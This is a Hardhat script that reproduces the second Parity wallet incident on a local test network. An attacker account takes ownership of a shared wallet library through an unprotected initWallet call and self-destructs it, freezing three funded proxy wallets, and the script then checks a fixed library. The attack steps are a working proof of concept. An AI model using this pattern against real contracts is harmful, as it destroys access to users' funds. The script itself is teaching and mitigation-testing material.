import hre from "hardhat";
import { parseEther, formatEther } from "ethers";

async function main() {
    console.log("=== Parity Hack #2 Simulation (Library Self-Destruct) ===");
    console.log("Note: This does not steal ETH. It freezes the proxy wallets permanently.");

    const [deployer, owner1, owner2, owner3, attacker] = await hre.ethers.getSigners();

    // 1. Deploy Vulnerable Shared Library
    const SharedLibraryVulnerable = await hre.ethers.getContractFactory("SharedWalletLibraryVulnerable");
    const lib = await SharedLibraryVulnerable.deploy();
    await lib.waitForDeployment();
    const libAddr = await lib.getAddress();
    console.log(`\nVulnerable Shared Library deployed at: ${libAddr}`);

    let libCode = await hre.ethers.provider.getCode(libAddr);
    console.log(`Library bytecode length before attack: ${(libCode.length - 2) / 2} bytes`);

    // 2. Deploy 3 Proxies connected to the shared library
    const Proxy = await hre.ethers.getContractFactory("SharedWallet");
    const wallets = [];
    const owners = [owner1, owner2, owner3];
    
    for (let i = 0; i < 3; i++) {
        const wallet = await Proxy.deploy(libAddr);
        await wallet.waitForDeployment();
        const walletAddr = await wallet.getAddress();
        
        // Fund with 5 ETH
        await deployer.sendTransaction({ to: walletAddr, value: parseEther("5.0") });

        // Initialize normally
        const walletLib = SharedLibraryVulnerable.attach(walletAddr);
        await walletLib.connect(owners[i]).initWallet(owners[i].address);
        wallets.push({ addr: walletAddr, lib: walletLib });
    }

    console.log("3 Proxy wallets deployed, funded with 5 ETH each, and initialized correctly.");

    // 3. Attacker calls initWallet directly on the library
    console.log("\nAttacker claiming ownership of the Shared Library itself...");
    await lib.connect(attacker).initWallet(attacker.address);
    const libOwner = await lib.owner();
    console.log(`Library owner is now: ${libOwner} (Attacker: ${attacker.address})`);

    // 4. Attacker calls killLibrary() on the library
    console.log("Attacker executing killLibrary()...");
    await lib.connect(attacker).killLibrary();

    // 5. Verify the library is destroyed
    libCode = await hre.ethers.provider.getCode(libAddr);
    console.log(`Library bytecode length after attack: ${(libCode.length - 2) / 2} bytes`);
    if (libCode === "0x") {
        console.log("SUCCESS: Library bytecode drops to 0 post-destruction.");
    }

    // 6. Verify Proxy Wallets are frozen but funds remain
    console.log("\nVerifying Proxy wallets are frozen...");
    for (let i = 0; i < 3; i++) {
        const bal = await hre.ethers.provider.getBalance(wallets[i].addr);
        console.log(`Wallet ${i + 1} Balance: ${formatEther(bal)} ETH`);
        
        try {
            // EVM delegatecall to an empty account returns true, so this won't revert
            await wallets[i].lib.connect(owners[i]).execute(owners[i].address, parseEther("1.0"), "0x");
            
            // Check if funds were actually transferred
            const balAfter = await hre.ethers.provider.getBalance(wallets[i].addr);
            if (bal === balAfter) {
                console.log(`SUCCESS: Wallet ${i + 1} execution did nothing. Funds are intact but functionally frozen.`);
            } else {
                console.log(`FAILED: Wallet ${i + 1} funds were transferred!`);
            }
        } catch (e) {
            console.log(`SUCCESS: Wallet ${i + 1} execution reverted. Funds are intact but functionally frozen.`);
        }
    }

    // 7. Test Mitigation
    console.log("\n--- Testing Fixed Shared Library ---");
    const SharedLibraryFixed = await hre.ethers.getContractFactory("SharedWalletLibraryFixed");
    const fixedLib = await SharedLibraryFixed.deploy();
    await fixedLib.waitForDeployment();
    const fixedLibAddr = await fixedLib.getAddress();

    try {
        await fixedLib.connect(attacker).initWallet(attacker.address);
        console.log("FAILED: Attacker initialized fixed library.");
    } catch (e) {
        console.log("SUCCESS: Fixed library contains no execution paths for direct initialization.");
    }
}

main().catch(console.error);
